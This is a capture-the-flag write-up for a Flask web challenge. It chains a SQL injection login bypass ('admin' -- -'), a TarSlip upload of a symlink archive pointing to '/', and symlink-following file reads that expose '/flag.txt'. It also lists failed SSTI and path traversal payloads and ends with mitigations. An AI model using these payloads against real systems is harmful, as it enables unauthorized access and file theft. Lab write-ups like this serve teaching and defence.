<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=PARTY+IN+BSB" alt="Typing SVG" /></a>

</div>

# Party in BSB — WEB · 🔴 HARD

- **Status:** ✅ SOLVED — full chain: SQLi auth bypass → TarSlip symlink plant → arbitrary file read.
- **Points:** 259 (final dynamic value)
- **Flag:** `IDP{sqli_t4r_syml1nk_nB4dXfaCV3}`
- **Attachment / Target:** `<HOST>:<PORT>` (Flask + gunicorn container, ephemeral)
- **Prompt:** *"Encontre o próximo rolê em Brasília."*

---

## TL;DR

1. Flask events site with a public search and an `/admin` file manager behind a login.
2. The login builds its SQL with `%`-formatting → classic auth bypass with `admin' -- -`.
3. The admin file manager confines paths to `/app` **textually**, but `send_file`/`os.scandir` **follow symlinks**, and the `.tar.gz` import runs `extractall` with no member sanitization (**TarSlip**). Upload a tar containing a symlink `x -> /`, then read `/flag.txt` via `download?path=x/flag.txt`.

## Analysis

Stack recon: `Server: gunicorn`, Jinja whitespace artifacts in the HTML → Flask. The home (`/`) is a search over an events DB (`q`, `category`, `month`, `price`, `order`); all of it is parameterized and dead (`q='` → `0 eventos`, no error). The real surface is `/admin` (302 → `/admin/login`).

### 1. SQL injection — login auth bypass

Downloading the source later (`/admin/download?path=app.py`) confirmed the login query is string-formatted:

```python
sql = "SELECT id, username, role FROM users WHERE username = '%s' AND password = '%s' LIMIT 1" % (username, password)
```

Payload `username=admin' -- -`, any password → comments out the password check, returns user id 1, and the server sets a session with `admin_id:1`. The form has a CSRF token bound to the session cookie, so each request carries cookie + the matching `csrf` field.

```
username=admin' -- -   password=x   →   302 Location: /admin
session cookie decodes to {"admin_id":1,"csrf":"..."}
```

### 2. The admin file manager and its confinement

`/admin?path=` lists directories; `/admin/download?path=` serves files. Both resolve the path through `app_path`:

```python
filesystem_path = Path(os.path.abspath(APP_ROOT / relative_path))
if filesystem_path != APP_ROOT and APP_ROOT not in filesystem_path.parents:
    abort(404)
```

`os.path.abspath` normalizes `../` **textually**, so plain path traversal (`?path=../../flag.txt`) is rejected — the resolved path must stay under `/app`. The `/app` listing only holds `app.py`, `data/`, `static/`, `templates/`, `requirements.txt`: the flag lives **outside** `/app`.

### 3. TarSlip — planting a symlink

The import route extracts the uploaded archive straight into `/app` with no per-member checks:

```python
def extract_archive(archive_data):
    with tarfile.open(fileobj=BytesIO(archive_data), mode="r:gz") as archive:
        members = archive.getmembers()
        ...
        archive.extractall(path=APP_ROOT)   # no sanitize / no filter
```

The confinement check in `app_path` is only textual, but `os.scandir`/`send_file` **dereference symlinks** (`is_dir(follow_symlinks=True)`, `send_file` follows). So a symlink `/app/x -> /` passes the `/app` check (its own path is under `/app`) while pointing at the filesystem root.

Build a one-member tar whose single entry is that symlink:

```python
info = tarfile.TarInfo("x"); info.type = tarfile.SYMTYPE; info.linkname = "/"
```

Upload it through `/admin/import` (carry the import form's CSRF). Then:

- `GET /admin?path=x` → lists `/` → reveals `/flag.txt` (next to `entrypoint.sh`, `.dockerenv`).
- `GET /admin/download?path=x/flag.txt` → `send_file` follows `x -> /`, reads `/flag.txt`.

```
IDP{sqli_t4r_syml1nk_nB4dXfaCV3}
```

## What didn't work

| Hypothesis | Result | Why |
|---|---|---|
| SSTI in `q` (`{{7*7}}`) | ✗ | Reflected HTML-escaped inside `value="..."`, not rendered as template |
| SQLi in search `q` / `order` | ✗ | Search is fully parameterized (`LIKE ? ESCAPE`); `order` only maps to `ASC`/`DESC` |
| Path traversal in `download?path=` | ✗ | `os.path.abspath` + `/app` parent check blocks textual `../` |

## Conclusion

Three bugs chained: a string-formatted login query, a path check that validates the link's location but not its target, and an unsanitized tar extraction. Any one alone is contained; together they give arbitrary file read of anything the app user can reach. Mitigations: parameterize the login query, use `safe_join` **and** resolve symlinks (`os.path.realpath`) before serving, and extract archives with `filter="data"` (Python ≥3.12) or validate each member.

---

## Appendix — tools

- `solve.py` — `python3 solve.py <base_url>`: runs the full chain (SQLi login → build & upload symlink tar → read `/flag.txt`) and prints the flag. Run by the user against the live instance; never executed from this repo.
- `exploit.tar.gz` — the 85-byte malicious archive (single symlink member `x -> /`).
- `app.py` — the challenge source, pulled via the admin download endpoint.
